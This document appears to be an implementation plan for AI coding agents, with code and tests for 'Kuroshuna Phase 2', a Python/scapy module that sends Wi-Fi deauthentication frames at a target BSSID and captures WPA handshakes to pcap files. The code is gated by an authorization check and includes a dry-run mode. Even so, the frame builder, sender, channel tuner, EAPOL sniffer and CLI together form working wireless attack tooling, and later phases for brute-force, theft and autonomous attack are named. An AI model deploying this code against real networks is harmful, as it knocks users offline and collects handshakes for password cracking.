# Kuroshuna Phase 2 — Tier A RF Offense (Pi/Alfa) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the Pi-side targeted RF offense — gated single-target Wi-Fi deauthentication and WPA handshake capture — every action routed through the Phase 1 authorization gate.

**Architecture:** A new `backend/offense/` package. `rf_targeted.py` holds `TargetedRF`, which checks `Gate.is_authorized(bssid, action)` (Phase 1) before it builds and transmits anything. **Transmission and sniffing are injected callables** (default = scapy on the Alfa monitor interface), so the gating logic and frame construction are fully unit-testable on a dev box with NO Wi-Fi hardware, and a `--no-tx` dry-run exercises the whole path without radiating. Pure Tier A: every action takes ONE authorized target (a specific BSSID). Untargeted floods are Tier B (Phase 4), not here.

**Tech Stack:** Python 3, scapy (already a dep — see `detectors/live_capture.py`), the Phase 1 `kuma_core.authz.Gate`.

**How to run tests:** from `backend/`: `python -m pytest tests/test_rf_targeted.py -v`

**Spec:** `docs/superpowers/specs/2026-06-09-kuroshuna-offensive-mode-design.md` (§ "Tier A — Targeted offense"). Depends on Phase 1 (`backend/kuma_core/authz.py`), already merged on this branch.

---

## File Structure

- Create: `backend/offense/__init__.py` — package marker.
- Create: `backend/offense/rf_targeted.py` — `TargetedRF` + `build_deauth_frames` + `RFResult` + CLI. One responsibility: targeted RF actions, gated.
- Create: `backend/tests/test_rf_targeted.py` — unit tests (mock sender/sniffer + injected `Gate`, `tmp_path`).
- Modify: `.gitignore` — ignore captured handshakes (`backend/data/handshakes/`).

`TargetedRF.__init__` takes `gate`, `iface`, `sender`, `set_channel`, `sniffer`, `dry_run` — all injectable — so tests never touch hardware and never transmit.

Key shared constants/contract used across tasks:
- `BROADCAST = "ff:ff:ff:ff:ff:ff"`
- `RFResult` dataclass: `ok: bool`, `reason: str`, `frames_sent: int`, `dry_run: bool = False`, `detail: str = ""`
- A deauth's authorization **target is the BSSID** (the network being acted on). `client` may be a specific station or `BROADCAST` (all stations of that ONE authorized BSSID — still Tier A because it's scoped to a single approved AP).

---

### Task 1: offense package + deauth frame builder (pure, no I/O)

**Files:**
- Create: `backend/offense/__init__.py`
- Create: `backend/offense/rf_targeted.py`
- Test: `backend/tests/test_rf_targeted.py`

- [ ] **Step 1: Write the failing test**

```python
# backend/tests/test_rf_targeted.py
"""Unit tests for Tier A targeted RF offense (no hardware; sender/sniffer injected)."""
from scapy.all import Dot11, Dot11Deauth  # type: ignore

from offense.rf_targeted import BROADCAST, build_deauth_frames


def test_build_deauth_frames_both_directions():
    bssid, client = "AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66"
    frames = build_deauth_frames(bssid, client, reason=7)
    assert len(frames) == 2  # AP->client and client->AP
    # AP -> client
    d0 = frames[0]
    assert d0.haslayer(Dot11Deauth)
    assert d0[Dot11].addr1.upper() == client      # receiver
    assert d0[Dot11].addr2.upper() == bssid        # transmitter
    assert d0[Dot11].addr3.upper() == bssid        # BSSID
    assert d0[Dot11Deauth].reason == 7
    # client -> AP
    d1 = frames[1]
    assert d1[Dot11].addr1.upper() == bssid
    assert d1[Dot11].addr2.upper() == client
    assert d1[Dot11].addr3.upper() == bssid


def test_build_deauth_broadcast_client_single_frame():
    frames = build_deauth_frames("AA:BB:CC:DD:EE:FF", BROADCAST, reason=7)
    # broadcast deauth only makes sense AP->all; one frame
    assert len(frames) == 1
    assert frames[0][Dot11].addr1.upper() == BROADCAST.upper()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rf_targeted.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'offense'`

- [ ] **Step 3: Write minimal implementation**

```python
# backend/offense/__init__.py
"""Kuroshuna offensive capability (Tier A targeted). Gate-bound; see kuma_core.authz."""
```

```python
# backend/offense/rf_targeted.py
"""Tier A targeted RF offense (Pi/Alfa): single-target deauth + WPA handshake
capture. EVERY action is authorized through kuma_core.authz.Gate before any
frame is built or sent. Transmission/sniffing are injected so this is unit-
testable without hardware and supports a --no-tx dry run. Untargeted floods are
Tier B (separate module) -- not here.
"""
from __future__ import annotations

from dataclasses import dataclass

from scapy.all import Dot11, Dot11Deauth, RadioTap  # type: ignore

BROADCAST = "ff:ff:ff:ff:ff:ff"


@dataclass
class RFResult:
    ok: bool
    reason: str
    frames_sent: int
    dry_run: bool = False
    detail: str = ""


def build_deauth_frames(bssid: str, client: str = BROADCAST, reason: int = 7):
    """Build deauth frame(s). For a specific client, both directions (AP->client
    and client->AP) so either endpoint drops the link. For broadcast, AP->all."""
    ap_to_client = (RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid)
                    / Dot11Deauth(reason=reason))
    if client.lower() == BROADCAST:
        return [ap_to_client]
    client_to_ap = (RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid)
                    / Dot11Deauth(reason=reason))
    return [ap_to_client, client_to_ap]
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_rf_targeted.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/__init__.py backend/offense/rf_targeted.py backend/tests/test_rf_targeted.py
git commit -m "feat(offense): deauth frame builder (pure, both-direction + broadcast)"
```

---

### Task 2: TargetedRF.deauth — gated, injected sender

**Files:**
- Modify: `backend/offense/rf_targeted.py`
- Test: `backend/tests/test_rf_targeted.py`

- [ ] **Step 1: Write the failing test**

```python
from kuma_core.authz import Gate
from offense.rf_targeted import TargetedRF


def _armed_gate(tmp_path, **extra):
    cfg = {"lab_mode": True, "kuroshuna_armed": True, "approved_targets": []}
    cfg.update(extra)
    return Gate(config=cfg, audit_file=tmp_path / "audit.jsonl")


def test_deauth_authorized_calls_sender(tmp_path):
    sent = []
    g = _armed_gate(tmp_path, approved_targets=["aa:bb:cc:dd:ee:ff"])
    rf = TargetedRF(gate=g, iface="wlan1mon",
                    sender=lambda frames, iface, count: sent.append((len(frames), iface, count)))
    res = rf.deauth("AA:BB:CC:DD:EE:FF", client="11:22:33:44:55:66", count=8)
    assert res.ok is True
    assert sent == [(2, "wlan1mon", 8)]          # 2 frames, our iface, count passed through
    assert res.frames_sent == 16                  # 2 frames * 8 bursts


def test_deauth_unauthorized_does_not_transmit(tmp_path):
    sent = []
    g = _armed_gate(tmp_path)                      # empty approved_targets
    rf = TargetedRF(gate=g, iface="wlan1mon",
                    sender=lambda *a: sent.append(a))
    res = rf.deauth("99:99:99:99:99:99")
    assert res.ok is False
    assert "not in authorized set" in res.reason
    assert sent == []                              # NEVER transmitted


def test_deauth_protected_bssid_refused(tmp_path):
    sent = []
    g = _armed_gate(tmp_path, approved_targets=["aa:bb:cc:dd:ee:ff"],
                    protect_bssids=["aa:bb:cc:dd:ee:ff"])
    rf = TargetedRF(gate=g, sender=lambda *a: sent.append(a))
    res = rf.deauth("AA:BB:CC:DD:EE:FF")
    assert res.ok is False
    assert "hard deny" in res.reason
    assert sent == []


def test_deauth_dry_run_builds_but_does_not_send(tmp_path):
    sent = []
    g = _armed_gate(tmp_path, approved_targets=["aa:bb:cc:dd:ee:ff"])
    rf = TargetedRF(gate=g, sender=lambda *a: sent.append(a), dry_run=True)
    res = rf.deauth("AA:BB:CC:DD:EE:FF")
    assert res.ok is True
    assert res.dry_run is True
    assert res.frames_sent == 0
    assert sent == []                              # dry run never transmits
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rf_targeted.py -k deauth -v`
Expected: FAIL — `TargetedRF` undefined

- [ ] **Step 3: Write minimal implementation**

Add the `DEFAULT_COUNT` constant near the top (after `BROADCAST`):

```python
DEFAULT_COUNT = 64           # deauth bursts per call (Tier A targeted, modest)
DEFAULT_REASON = 7           # 802.11 reason 7: class-3 frame from nonassociated STA
```

Add the class:

```python
def _scapy_sendp(frames, iface, count):
    from scapy.all import sendp  # type: ignore
    sendp(frames, iface=iface, count=count, inter=0.1, verbose=False)


class TargetedRF:
    """Gated targeted RF actions. All hardware touchpoints are injected so this
    is testable without a radio and supports dry runs."""

    def __init__(self, gate, iface: str | None = None, *, sender=None,
                 set_channel=None, sniffer=None, dry_run: bool = False) -> None:
        from kuma_core.config import settings
        self.gate = gate
        self.iface = iface or settings.monitor_interface
        self._sender = sender or _scapy_sendp
        self._set_channel = set_channel
        self._sniffer = sniffer
        self.dry_run = dry_run

    def deauth(self, bssid: str, client: str = BROADCAST,
               count: int = DEFAULT_COUNT, reason: int = DEFAULT_REASON) -> RFResult:
        # The authorization target is the BSSID (the network we act on).
        allowed, why = self.gate.is_authorized(bssid, "deauth")
        if not allowed:
            return RFResult(ok=False, reason=why, frames_sent=0)
        frames = build_deauth_frames(bssid, client, reason)
        if self.dry_run:
            return RFResult(ok=True, reason="dry-run (no tx)", frames_sent=0,
                            dry_run=True,
                            detail=f"would send {len(frames)}x{count} to {bssid}/{client}")
        self._sender(frames, self.iface, count)
        return RFResult(ok=True, reason=why, frames_sent=len(frames) * count,
                        detail=f"deauth {bssid} <-> {client}")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_rf_targeted.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/rf_targeted.py backend/tests/test_rf_targeted.py
git commit -m "feat(offense): TargetedRF.deauth - gated, injected sender, dry-run"
```

---

### Task 3: TargetedRF.capture_handshake — gated, injected channel-set + sniffer

**Files:**
- Modify: `backend/offense/rf_targeted.py`
- Test: `backend/tests/test_rf_targeted.py`

- [ ] **Step 1: Write the failing test**

```python
from scapy.all import Dot11, EAPOL, RadioTap  # add EAPOL to the scapy import line


def _fake_eapol(bssid="AA:BB:CC:DD:EE:FF", client="11:22:33:44:55:66"):
    return RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / EAPOL()


def test_capture_authorized_writes_pcap(tmp_path):
    chans = []
    g = _armed_gate(tmp_path, approved_targets=["aa:bb:cc:dd:ee:ff"])
    rf = TargetedRF(
        gate=g, iface="wlan1mon",
        set_channel=lambda iface, ch: chans.append((iface, ch)),
        sniffer=lambda iface, bssid, timeout: [_fake_eapol(), _fake_eapol()],
        sender=lambda *a: None)
    res = rf.capture_handshake("AA:BB:CC:DD:EE:FF", channel=6, timeout=1,
                               out_dir=tmp_path / "handshakes")
    assert res.ok is True
    assert chans == [("wlan1mon", 6)]                 # tuned to the channel first
    assert res.frames_sent == 2                        # EAPOL frames captured
    pcaps = list((tmp_path / "handshakes").glob("*.pcap"))
    assert len(pcaps) == 1
    assert "AABBCCDDEEFF" in pcaps[0].name.replace(":", "").upper()


def test_capture_unauthorized_refused_no_sniff(tmp_path):
    sniffed = []
    g = _armed_gate(tmp_path)                           # nothing approved
    rf = TargetedRF(gate=g,
                    set_channel=lambda *a: None,
                    sniffer=lambda *a: sniffed.append(a) or [])
    res = rf.capture_handshake("99:99:99:99:99:99", channel=6, timeout=1,
                               out_dir=tmp_path / "h")
    assert res.ok is False
    assert "not in authorized set" in res.reason
    assert sniffed == []                                # never even tuned/sniffed


def test_capture_no_eapol_reports_empty(tmp_path):
    g = _armed_gate(tmp_path, approved_targets=["aa:bb:cc:dd:ee:ff"])
    rf = TargetedRF(gate=g, set_channel=lambda *a: None,
                    sniffer=lambda *a: [])
    res = rf.capture_handshake("AA:BB:CC:DD:EE:FF", channel=6, timeout=1,
                               out_dir=tmp_path / "h")
    assert res.ok is True
    assert res.frames_sent == 0
    assert "no eapol" in res.reason.lower()
    assert list((tmp_path / "h").glob("*.pcap")) == []  # nothing to write
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rf_targeted.py -k capture -v`
Expected: FAIL — `TargetedRF` has no `capture_handshake`

- [ ] **Step 3: Write minimal implementation**

Add real default sniffer/channel helpers and the method. First add these module-level functions:

```python
def _scapy_set_channel(iface, channel):
    import subprocess
    subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], check=False)


def _scapy_sniff(iface, bssid, timeout):
    """Capture EAPOL frames for one BSSID on the current channel."""
    from scapy.all import AsyncSniffer, Dot11, EAPOL  # type: ignore
    b = bssid.lower()

    def _match(pkt):
        if not pkt.haslayer(EAPOL) or not pkt.haslayer(Dot11):
            return False
        addrs = {(pkt[Dot11].addr1 or "").lower(),
                 (pkt[Dot11].addr2 or "").lower(),
                 (pkt[Dot11].addr3 or "").lower()}
        return b in addrs

    sn = AsyncSniffer(iface=iface, lfilter=_match)
    sn.start()
    import time
    time.sleep(timeout)
    return sn.stop() or []
```

Add to the scapy import at the top of the file: `wrpcap` (i.e. `from scapy.all import Dot11, Dot11Deauth, RadioTap, wrpcap`).

Add the method to `TargetedRF`:

```python
    def capture_handshake(self, bssid: str, channel: int, timeout: int = 30,
                          out_dir=None) -> RFResult:
        from kuma_core.config import DATA_DIR
        allowed, why = self.gate.is_authorized(bssid, "capture")
        if not allowed:
            return RFResult(ok=False, reason=why, frames_sent=0)
        set_ch = self._set_channel or _scapy_set_channel
        sniff = self._sniffer or _scapy_sniff
        if self.dry_run:
            return RFResult(ok=True, reason="dry-run (no tx)", frames_sent=0,
                            dry_run=True, detail=f"would capture {bssid} ch{channel}")
        set_ch(self.iface, channel)
        pkts = sniff(self.iface, bssid, timeout)
        if not pkts:
            return RFResult(ok=True, reason="no EAPOL captured", frames_sent=0)
        out = out_dir or (DATA_DIR / "handshakes")
        from pathlib import Path
        out = Path(out)
        out.mkdir(parents=True, exist_ok=True)
        from kuma_core.events import utcnow_iso
        stamp = utcnow_iso().replace(":", "").replace("-", "")
        path = out / f"{bssid.replace(':', '').upper()}-{stamp}.pcap"
        wrpcap(str(path), pkts)
        return RFResult(ok=True, reason=why, frames_sent=len(pkts),
                        detail=f"captured {len(pkts)} EAPOL -> {path.name}")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_rf_targeted.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/rf_targeted.py backend/tests/test_rf_targeted.py
git commit -m "feat(offense): TargetedRF.capture_handshake - gated, pcap out, injected sniff"
```

---

### Task 4: CLI entrypoint (`python -m offense.rf_targeted`)

**Files:**
- Modify: `backend/offense/rf_targeted.py`
- Test: `backend/tests/test_rf_targeted.py`

- [ ] **Step 1: Write the failing test**

```python
from offense.rf_targeted import build_args, run_cli


def test_cli_deauth_dryrun_routes_to_deauth(tmp_path, capsys):
    g = _armed_gate(tmp_path, approved_targets=["aa:bb:cc:dd:ee:ff"])
    calls = []
    rf = TargetedRF(gate=g, sender=lambda *a: calls.append("sent"), dry_run=True)
    args = build_args(["--bssid", "AA:BB:CC:DD:EE:FF", "--deauth",
                       "--client", "11:22:33:44:55:66", "--count", "4", "--no-tx"])
    rc = run_cli(args, rf=rf)
    assert rc == 0
    assert calls == []                       # dry-run: nothing sent
    out = capsys.readouterr().out
    assert "dry-run" in out.lower()


def test_cli_requires_an_action(tmp_path):
    g = _armed_gate(tmp_path)
    rf = TargetedRF(gate=g, sender=lambda *a: None, dry_run=True)
    args = build_args(["--bssid", "AA:BB:CC:DD:EE:FF"])  # no --deauth/--capture
    rc = run_cli(args, rf=rf)
    assert rc == 2                            # usage error
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rf_targeted.py -k cli -v`
Expected: FAIL — no `build_args` / `run_cli`

- [ ] **Step 3: Write minimal implementation**

```python
def build_args(argv):
    import argparse
    p = argparse.ArgumentParser(
        prog="offense.rf_targeted",
        description="Kuroshuna Tier A targeted RF: gated deauth + handshake capture.")
    p.add_argument("--bssid", required=True, help="target BSSID (must be authorized)")
    p.add_argument("--client", default=BROADCAST, help="target station (default: broadcast)")
    p.add_argument("--deauth", action="store_true", help="send targeted deauth")
    p.add_argument("--capture", action="store_true", help="capture WPA handshake")
    p.add_argument("--channel", type=int, default=6)
    p.add_argument("--count", type=int, default=DEFAULT_COUNT)
    p.add_argument("--timeout", type=int, default=30)
    p.add_argument("--iface", default=None)
    p.add_argument("--no-tx", dest="no_tx", action="store_true",
                   help="dry run: build/authorize but never transmit")
    return p.parse_args(argv)


def run_cli(args, rf=None) -> int:
    if not args.deauth and not args.capture:
        print("error: specify --deauth and/or --capture", flush=True)
        return 2
    if rf is None:
        from kuma_core.authz import Gate
        rf = TargetedRF(gate=Gate(), iface=args.iface, dry_run=args.no_tx)
    rc = 0
    if args.deauth:
        res = rf.deauth(args.bssid, client=args.client, count=args.count)
        print(f"[deauth] ok={res.ok} {res.reason} frames={res.frames_sent} "
              f"{res.detail}", flush=True)
        rc = rc or (0 if res.ok else 1)
    if args.capture:
        res = rf.capture_handshake(args.bssid, channel=args.channel,
                                   timeout=args.timeout)
        print(f"[capture] ok={res.ok} {res.reason} frames={res.frames_sent} "
              f"{res.detail}", flush=True)
        rc = rc or (0 if res.ok else 1)
    return rc


if __name__ == "__main__":  # pragma: no cover
    import sys
    sys.exit(run_cli(build_args(sys.argv[1:])))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_rf_targeted.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/offense/rf_targeted.py backend/tests/test_rf_targeted.py
git commit -m "feat(offense): rf_targeted CLI (--deauth/--capture/--no-tx)"
```

---

### Task 5: Ignore captured handshakes

**Files:**
- Modify: `.gitignore` (repo root)
- Test: `backend/tests/test_rf_targeted.py`

- [ ] **Step 1: Write the failing test**

```python
from pathlib import Path


def test_handshakes_dir_is_gitignored():
    gi = (Path(__file__).resolve().parents[2] / ".gitignore").read_text(encoding="utf-8")
    assert "backend/data/handshakes/" in gi
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_rf_targeted.py -k gitignore -v`
Expected: FAIL — pattern not present

- [ ] **Step 3: Edit `.gitignore`** — add:

```gitignore
# Captured WPA handshakes (sensitive; local only)
backend/data/handshakes/
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_rf_targeted.py -v`
Expected: PASS (full file green)

- [ ] **Step 5: Commit**

```bash
git add .gitignore backend/tests/test_rf_targeted.py
git commit -m "chore(offense): gitignore captured handshakes"
```

---

## Phase exit criteria

- `python -m pytest tests/test_rf_targeted.py -v` → all green; full suite still green.
- `backend/offense/rf_targeted.py` exposes `build_deauth_frames`, `TargetedRF`
  (`deauth`, `capture_handshake`), `RFResult`, `build_args`, `run_cli`.
- Every `deauth`/`capture_handshake` call goes through `Gate.is_authorized` BEFORE
  any frame is built/sent or any channel is tuned; unauthorized → no transmission.
- `--no-tx` dry run exercises authorization + frame build without radiating.
- Captured handshakes are gitignored.

## On-device validation (Jax, on the Pi — cannot be done from the dev box)

These need the Alfa in monitor mode and Jax's own rigs as targets. Not part of the
automated tests; run after merge with real config populated.
1. Populate `lab_targets.json`: `own_infra` = Pi/Lily/ASUS MACs+IPs; `approved_targets`
   = your pwnagotchi/Bjorn rig BSSIDs; set `lab_mode` + `kuroshuna_armed`.
2. Dry run first: `sudo ./.venv/bin/python -m offense.rf_targeted --bssid <rig> --deauth --no-tx`
   → confirm "ok=True dry-run", audit line written, NOTHING transmitted.
3. Live deauth against your own test AP; confirm the client drops + the audit log.
4. Capture: `--capture --channel <n>` against your own AP while a client reconnects;
   confirm a PCAP lands in `backend/data/handshakes/`.
5. Confirm a NON-approved BSSID is refused with no transmission.

## Next phases (separate plans)

- **Phase 3** — Tier A network offense (Bjorn-style scan/brute/steal), gate-checked.
- **Phase 2b (with UI/firmware)** — T-Deck ESP32 RF via Bruce-style injection, authorized
  over a new `/api/kuroshuna/authorize` round-trip so the Pi gate stays authoritative.
- **Phase 4** — Tier B broadcast. **Phase 5** — autonomous orchestrator.
